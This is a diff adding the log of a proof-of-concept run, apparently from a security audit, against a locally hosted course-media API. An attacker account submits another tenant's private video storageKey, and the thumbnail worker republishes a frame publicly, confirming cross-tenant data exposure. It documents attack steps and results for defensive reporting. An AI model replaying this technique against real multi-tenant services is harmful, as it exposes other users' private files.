@@ -1,0 +1,17 @@
+========================================================================
+VULN-011: Unvalidated storageKey -> server processes/publishes arbitrary storage objects
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] POST /organization/assets accepts any storageKey (assets.ts:24) — no prefix/ownership check
+[SETUP] attacker STUDENT org member: b90be333-8221-4fe0-b324-aae290d833c5 roles={'48bbdff8-2ad5-46a3-a259-2ca3d52677dd': 3}
+[SETUP] seeded foreign private video: videos/44444444-4444-4444-8444-444444444444/private-lecture-mp4_306f6508.mp4 (10890 bytes)
+[STEP] attacker POST /organization/assets storageKey=<foreign videos key> (byteSize=10890)
+[INFO]   -> HTTP 201 {"success":true,"data":{"id":"0b2b04e6-48eb-4bb6-8fde-280ca4cca0a5","organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","kind":"video","provider":"upload","
+[INFO]   DB assets row [storage_key|org|created_by] = 44444444-4444-4444-8444-444444444444/private-lecture-mp4_306f6508.mp4|48bbdff8-2ad5-46a3-a259-2ca3d52677dd|b90be333-8221-4fe0-b324-aae290d833c5
+[STEP] waiting up to 90s for the thumbnail worker to publish frame(s)...
+[INFO]   worker published thumbnailUrl = http://localhost:21528/media/thumbnails/0b2b04e6-48eb-4bb6-8fde-280ca4cca0a5/middle-1790520568845.jpg
+[INFO]   anonymous GET thumbnail -> HTTP 200, 8820 bytes, jpeg=True
+[PROOF] asset 0b2b04e6-48eb-4bb6-8fde-280ca4cca0a5 was created storing the FOREIGN storageKey '44444444-4444-4444-8444-444444444444/private-lecture-mp4_306f6508.mp4' under the attacker's org 48bbdff8-2ad5-46a3-a259-2ca3d52677dd (profile b90be333-8221-4fe0-b324-aae290d833c5) — an arbitrary/other-tenant object key accepted with no prefix or ownership check
+[PROOF] the media worker downloaded videos/44444444-4444-4444-8444-444444444444/private-lecture-mp4_306f6508.mp4 and published a PUBLIC JPEG frame at http://localhost:21528/media/thumbnails/0b2b04e6-48eb-4bb6-8fde-280ca4cca0a5/middle-1790520568845.jpg, which the attacker fetched anonymously -> confidentiality break on a foreign private video (thumbnail exfil)
+==> VULN-011: CONFIRMED — arbitrary storageKey accepted AND its frame republished to a public bucket
+[OK] exploit confirmed — server trusts a client-supplied storageKey
